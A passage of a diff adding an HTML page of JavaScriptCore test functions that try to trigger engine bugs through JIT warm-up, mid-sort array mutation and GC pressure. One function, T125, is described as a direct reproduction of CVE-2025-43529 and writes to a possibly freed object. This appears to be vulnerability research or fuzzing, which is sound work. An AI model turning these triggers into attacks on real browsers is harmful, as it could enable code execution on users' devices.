+    };
+    Promise.resolve(recursive).then(function(){}).catch(function(){});
+  } catch(e){}
+  log('Teste 122: fim');
+}
+
+// T123 — JSC: Array.prototype.sort TimSort com elemento que muda durante comparacao
+// JSC usa TimSort; se o array muda de tamanho durante sort (via getter)
+// o algoritmo pode acessar indice invalido
+function t123(){
+  log('Teste 123: inicio');
+  try {
+    // Array grande o suficiente para usar TimSort (nao insertion sort)
+    const arr = [];
+    for(let i = 0; i < 128; i++) arr.push(Math.random());
+
+    let sortCalls = 0;
+    arr.sort(function(a, b){
+      sortCalls++;
+      // Na chamada 32: fazer algo que pode invalidar o array
+      if(sortCalls === 32){
+        // Adicionar propriedade no array (nao muda length mas muda estrutura)
+        arr.extra = 'injected';
+        // Converter um elemento para objeto (muda tipo do slot)
+        arr[0] = { valueOf(){ return 0.5; } };
+      }
+      if(sortCalls === 64){
+        // Resetar arr[0] para numero
+        arr[0] = 0.5;
+        delete arr.extra;
+      }
+      return a - b;
+    });
+
+    // Sort em array com holes e getters misturados
+    const mixed = [5, , 3, , 1, , 4, , 2];
+    Object.defineProperty(mixed, '1', {
+      get: function(){ return 99; },
+      enumerable: true, configurable: true
+    });
+    try { mixed.sort(); } catch(e){}
+  } catch(e){}
+  log('Teste 123: fim');
+}
+
+// T124 — JSC: CreateThis com objeto que muda de estrutura antes de set de props
+// new Foo() chama CreateThis que aloca objeto com estrutura de Foo;
+// se Foo.prototype muda durante a alocacao, o objeto pode ter estrutura errada
+function t124(){
+  log('Teste 124: inicio');
+  try {
+    let ctorCallCount = 0;
+
+    function Foo(n){
+      ctorCallCount++;
+      // Na 1000a chamada, mudar Foo.prototype durante a execucao do constructor
+      if(ctorCallCount === 1000){
+        Foo.prototype.newMethod = function(){ return 42; };
+        Foo.prototype.x = 0;
+      }
+      this.a = n;
+      this.b = n * 2;
+    }
+    Foo.prototype.method = function(){ return this.a + this.b; };
+
+    // Warmup: JIT compile new Foo() e callMethod
+    function create(n){ return new Foo(n); }
+    function callMethod(o){ return o.method(); }
+
+    const instances = [];
+    for(let i = 0; i < 0x10000; i++){
+      const inst = create(i);
+      if(i < 200) instances.push(inst);
+      callMethod(inst);
+    }
+
+    // Pos-JIT: mais chamadas que passam pelo ponto de mutacao do prototype
+    for(let i = 0; i < 2000; i++){
+      try {
+        const inst = create(i);
+        callMethod(inst);
+        // Acessar newMethod se existir (pode nao estar no IC antigo)
+        if(inst.newMethod) inst.newMethod();
+      } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 124: fim');
+}
+
+// T125 — CVE-2025-43529 trigger direto: FTL Phi escape + GC + OSR hint stale
+// Reproducao mais proxima possivel do CVE: loop que cria objeto Phi-merged,
+// GC e forcado, OSR exit usa hint stale que aponta para objeto freed
+function t125(){
+  log('Teste 125: inicio');
+  try {
+    let gcPressure = null;
+
+    function phiEscapeLoop(iters, forceEscape){
+      let result = 0;
+      for(let i = 0; i < iters; i++){
+        let p;
+        if(i % 2 === 0){
+          p = { val: i, arr: [i, i+1] };     // Upsilon A
+        } else {
+          p = { val: i * 2, arr: [i*2, i] }; // Upsilon B
+        }
+        // Phi de p dentro do loop — JIT tenta sinkar mas e Phi no loop
+
+        result += p.val;
+        result += p.arr[0];
+
+        // A cada 500 iters, forcar GC: se barrier faltou em p, crash aqui
+        if(i % 500 === 0){
+          gcPressure = new Array(20000).fill(null).map(function(){
+            return { tmp: new Uint8Array(8) };
+          });
+          gcPressure = null;
+        }
+
+        // Escape condicional: se forceEscape, p escapa para fora do loop
+        if(forceEscape && i === iters - 1){
+          gcPressure = p; // forca escape do ultimo Phi
+        }
+      }
+      return result;
+    }
+
+    // Warmup sem escape — JIT tenta sinkar p
+    for(let i = 0; i < 20; i++) phiEscapeLoop(1000, false);
+
+    // Pos-FTL: forcar escape no ultimo elemento
+    for(let i = 0; i < 50; i++){
+      try {
+        phiEscapeLoop(1000, true);
+        // Usar gcPressure (pode ser objeto freed se CVE presente)
+        if(gcPressure && typeof gcPressure === 'object'){
+          let v = gcPressure.val;
+          gcPressure.val = v + 1;
+          gcPressure.arr[0] = 0xDEAD;
+        }
+      } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 125: fim');
+}
+</script>
+</body>
+</html>
